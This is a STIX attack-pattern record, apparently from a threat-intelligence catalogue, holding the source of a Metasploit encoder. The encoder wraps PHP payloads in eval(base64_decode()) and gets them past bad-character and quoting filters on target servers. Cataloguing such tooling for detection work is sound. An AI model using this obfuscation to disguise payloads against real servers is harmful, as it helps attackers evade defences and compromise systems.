{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2d6d61f6-fb8d-44b3-9855-7ff8a6ea1f30",
    "created": "2024-08-14T16:33:19.225236Z",
    "modified": "2024-08-14T16:33:19.225248Z",
    "name": "PHP Base64 Encoder",
    "description": " This encoder returns a base64 string encapsulated in eval(base64_decode()), increasing the size by a bit more than one third. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/php/base64.rb",
            "external_id": "base64.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder\n  Rank = GreatRanking\n\n  def initialize\n    super(\n      'Name' => 'PHP Base64 Encoder',\n      'Description' => %q{\n        This encoder returns a base64 string encapsulated in\n        eval(base64_decode()), increasing the size by a bit more than\n        one third.\n      },\n      'Author' => 'egypt',\n      'License' => BSD_LICENSE,\n      'Arch' => ARCH_PHP)\n  end\n\n  def encode_block(state, buf)\n    # Have to have these for the decoder stub, so if they're not available,\n    # there's nothing we can do here.\n    %w[c h r ( ) . e v a l b a s e 6 4 _ d e c o d e ;].uniq.each do |c|\n      raise BadcharError if state.badchars.include?(c)\n    end\n\n    # Modern versions of PHP choke on unquoted literal strings.\n    quote = \"'\"\n    if state.badchars.include?(\"'\")\n      raise BadcharError.new, \"The #{self.name} encoder failed to encode the decoder stub without bad characters.\" if state.badchars.include?('\"')\n\n      quote = '\"'\n    end\n\n    # PHP escapes quotes by default with magic_quotes_gpc, so we use some\n    # tricks to get around using them.\n    #\n    # The raw, unquoted base64 without the terminating equals works because\n    # PHP treats it like a string.  There are, however, a couple of caveats\n    # because first, PHP tries to parse the bare string as a constant.\n    # Because of this, the string is limited to things that can be\n    # identifiers, i.e., things that start with [a-zA-Z] and contain only\n    # [a-zA-Z0-9_].  Also, for payloads that encode to more than 998\n    # characters, only part of the payload gets unencoded on the victim,\n    # presumably due to a limitation in PHP identifier name lengths, so we\n    # break the encoded payload into roughly 900-byte chunks.\n    #\n    # https://wiki.php.net/rfc/deprecate-bareword-strings\n\n    b64 = Rex::Text.encode_base64(buf)\n\n    # The '=' or '==' used for padding at the end of the base64 encoded\n    # data is unnecessary and can cause parse errors when we use it as a\n    # raw string, so strip it off.\n    b64.gsub!(/[=\\n]+/, '')\n\n    # The first character must not be a non-alpha character or PHP chokes.\n    i = 0\n    b64[i] = \"chr(#{b64[i]}).\" while (b64[i].chr =~ %r{[0-9/+]})\n\n    # Similarly, when we seperate large payloads into chunks to avoid the\n    # 998-byte problem mentioned above, we have to make sure that the first\n    # character of each chunk is an alpha character.  This simple algorithm\n    # will create a broken string in the case of 99 consecutive digits,\n    # slashes, and plusses in the base64 encoding, but the likelihood of\n    # that is low enough that I don't care.\n    i = 900\n    while i < b64.length\n      i += 1 while (b64[i].chr =~ %r{[0-9/+]})\n      b64.insert(i, '.')\n      i += 900\n    end\n\n    # Plus characters ('+') in a uri are converted to spaces, so replace\n    # them with something that PHP will turn into a plus.  Slashes cause\n    # parse errors on the server side, so do the same for them.\n    b64.gsub!('+', '.chr(43).')\n    b64.gsub!('/', '.chr(47).')\n\n    state.badchars.each_byte do |byte|\n      # Last ditch effort, if any of the normal characters used by base64\n      # are badchars, try to replace them with something that will become\n      # the appropriate thing on the other side.\n      if b64.include?(byte.chr)\n        b64.gsub!(byte.chr, \".chr(#{byte}).\")\n      end\n    end\n\n    # In the case where a plus or slash happened at the end of a chunk,\n    # we'll have two dots next to each other, so fix it up.  Note that this\n    # is searching for literal dots, not a regex matching any two\n    # characters\n    b64.gsub!('..', '.')\n\n    # Some of the shenanigans above could have appended a dot, which will\n    # cause a syntax error.  Remove any trailing dots.\n    b64.chomp!('.')\n\n    return 'eval(base64_decode(' + quote + b64 + quote + '));'\n  end\nend\n"
}